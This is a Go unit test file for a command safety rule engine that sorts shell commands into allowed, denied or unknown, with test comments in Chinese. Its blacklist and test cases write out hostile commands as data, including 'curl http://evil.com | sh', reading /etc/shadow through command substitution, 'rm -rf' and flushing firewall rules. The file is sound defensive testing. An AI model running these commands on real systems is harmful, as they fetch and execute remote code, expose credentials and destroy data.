package safety

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestNewRuleEngineFromConfig(t *testing.T) {
	whitelist := []string{"df", "cat", "grep", "ps aux", "docker ps", "ping", "journalctl", "free"}
	blacklist := []string{
		`rm\s+-rf`,
		`rm\s+-r`,
		`shutdown`,
		`reboot`,
		`chmod\s+777`,
		`kill\s+-9`,
		`curl.*\|.*sh`,
		`\$\(`,
		`systemctl\s+stop`,
		`iptables\s+-F`,
	}

	engine, err := NewRuleEngineFromConfig(whitelist, blacklist)
	require.NoError(t, err)
	require.NotNil(t, engine)
}

func TestNewRuleEngineFromConfig_InvalidRegex(t *testing.T) {
	// 测试无效正则表达式时，应跳过该规则但继续加载其他规则
	whitelist := []string{"df"}
	blacklist := []string{
		`rm\s+-rf`,
		`[invalid(`, // 无效正则
		`reboot`,
	}

	engine, err := NewRuleEngineFromConfig(whitelist, blacklist)
	require.NoError(t, err)
	require.NotNil(t, engine)

	// 验证有效规则仍然可以工作
	result := engine.Evaluate("reboot")
	assert.Equal(t, "deny", result.Action)
}

func TestRuleEngine_Evaluate(t *testing.T) {
	whitelist := []string{"df", "cat", "grep", "ps aux", "docker ps", "ping", "journalctl", "free"}
	blacklist := []string{
		`rm\s+-rf`,
		`rm\s+-r`,
		`shutdown`,
		`reboot`,
		`chmod\s+777`,
		`kill\s+-9`,
		`curl.*\|.*sh`,
		`\$\(`,
		`systemctl\s+stop`,
		`iptables\s+-F`,
	}

	engine, err := NewRuleEngineFromConfig(whitelist, blacklist)
	require.NoError(t, err)

	tests := []struct {
		name           string
		command        string
		expectedAction string
		shouldContain  string // Reason 中应包含的内容
	}{
		// 白名单命中
		{
			name:           "whitelist_df_with_args",
			command:        "df -h",
			expectedAction: "allow",
			shouldContain:  "白名单",
		},
		{
			name:           "whitelist_cat_with_path",
			command:        "cat /etc/hosts",
			expectedAction: "allow",
			shouldContain:  "白名单",
		},
		{
			name:           "whitelist_grep_with_args",
			command:        "grep error /var/log/syslog",
			expectedAction: "allow",
			shouldContain:  "白名单",
		},
		{
			name:           "whitelist_ps_aux_with_extra_args",
			command:        "ps aux --sort",
			expectedAction: "allow",
			shouldContain:  "白名单",
		},
		{
			name:           "whitelist_docker_ps",
			command:        "docker ps -a",
			expectedAction: "allow",
			shouldContain:  "白名单",
		},
		{
			name:           "whitelist_ping",
			command:        "ping 8.8.8.8",
			expectedAction: "allow",
			shouldContain:  "白名单",
		},
		{
			name:           "whitelist_journalctl",
			command:        "journalctl -u kubelet",
			expectedAction: "allow",
			shouldContain:  "白名单",
		},
		{
			name:           "whitelist_free",
			command:        "free -m",
			expectedAction: "allow",
			shouldContain:  "白名单",
		},

		// 黑名单命中
		{
			name:           "blacklist_rm_rf",
			command:        "rm -rf /tmp",
			expectedAction: "deny",
			shouldContain:  "rm\\s+-rf",
		},
		{
			name:           "blacklist_rm_r",
			command:        "rm -r /var",
			expectedAction: "deny",
			shouldContain:  "rm\\s+-r",
		},
		{
			name:           "blacklist_shutdown",
			command:        "shutdown -h now",
			expectedAction: "deny",
			shouldContain:  "shutdown",
		},
		{
			name:           "blacklist_reboot",
			command:        "reboot",
			expectedAction: "deny",
			shouldContain:  "reboot",
		},
		{
			name:           "blacklist_chmod_777",
			command:        "chmod 777 /etc/passwd",
			expectedAction: "deny",
			shouldContain:  "chmod\\s+777",
		},
		{
			name:           "blacklist_kill_9",
			command:        "kill -9 1234",
			expectedAction: "deny",
			shouldContain:  "kill\\s+-9",
		},
		{
			name:           "blacklist_curl_pipe_sh",
			command:        "curl http://evil.com | sh",
			expectedAction: "deny",
			shouldContain:  "curl.*\\|.*sh",
		},
		{
			name:           "blacklist_dollar_paren",
			command:        "echo $( cat /etc/shadow )",
			expectedAction: "deny",
			shouldContain:  "\\$\\(",
		},
		{
			name:           "blacklist_systemctl_stop",
			command:        "systemctl stop kubelet",
			expectedAction: "deny",
			shouldContain:  "systemctl\\s+stop",
		},
		{
			name:           "blacklist_iptables_F",
			command:        "iptables -F",
			expectedAction: "deny",
			shouldContain:  "iptables\\s+-F",
		},

		// Unknown 命令
		{
			name:           "unknown_systemctl_status",
			command:        "systemctl status kubelet",
			expectedAction: "unknown",
			shouldContain:  "未知命令",
		},
		{
			name:           "unknown_lsof",
			command:        "lsof -i :80",
			expectedAction: "unknown",
			shouldContain:  "未知命令",
		},
		{
			name:           "unknown_strace",
			command:        "strace -p 1234",
			expectedAction: "unknown",
			shouldContain:  "未知命令",
		},

		// 边界情况
		{
			name:           "empty_command",
			command:        "",
			expectedAction: "unknown",
			shouldContain:  "空命令",
		},
		{
			name:           "whitespace_only",
			command:        "   ",
			expectedAction: "unknown",
			shouldContain:  "空命令",
		},
		{
			name:           "extra_spaces_normalized",
			command:        "  df   -h  ",
			expectedAction: "allow",
			shouldContain:  "白名单",
		},
		{
			name:           "uppercase_command_normalized",
			command:        "DF -h",
			expectedAction: "allow",
			shouldContain:  "白名单",
		},
		{
			name:           "mixed_case_first_token",
			command:        "Cat /etc/hosts",
			expectedAction: "allow",
			shouldContain:  "白名单",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := engine.Evaluate(tt.command)
			assert.Equal(t, tt.expectedAction, result.Action, "命令: %s", tt.command)
			assert.Contains(t, result.Reason, tt.shouldContain, "命令: %s", tt.command)
		})
	}
}

func TestNormalizeCommand(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{"df -h", "df -h"},
		{"  df   -h  ", "df -h"},
		{"DF -h", "df -h"},
		{"  Cat   /etc/hosts  ", "cat /etc/hosts"},
		{"", ""},
		{"   ", ""},
		{"grep  error   /var/log/syslog", "grep error /var/log/syslog"},
		{"PS aux --sort", "ps aux --sort"},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			result := normalizeCommand(tt.input)
			assert.Equal(t, tt.expected, result)
		})
	}
}

func TestNewRuleEngine_LoadFromFile(t *testing.T) {
	// 测试从配置文件加载
	engine, err := NewRuleEngine("../../../configs/safety_rules.yaml")
	require.NoError(t, err)
	require.NotNil(t, engine)

	// 测试配置文件中的白名单规则
	result := engine.Evaluate("cat /etc/hosts")
	assert.Equal(t, "allow", result.Action)

	// 测试配置文件中的黑名单规则
	result = engine.Evaluate("rm -rf /tmp")
	assert.Equal(t, "deny", result.Action)

	// 测试未知命令
	result = engine.Evaluate("unknown-command")
	assert.Equal(t, "unknown", result.Action)
}
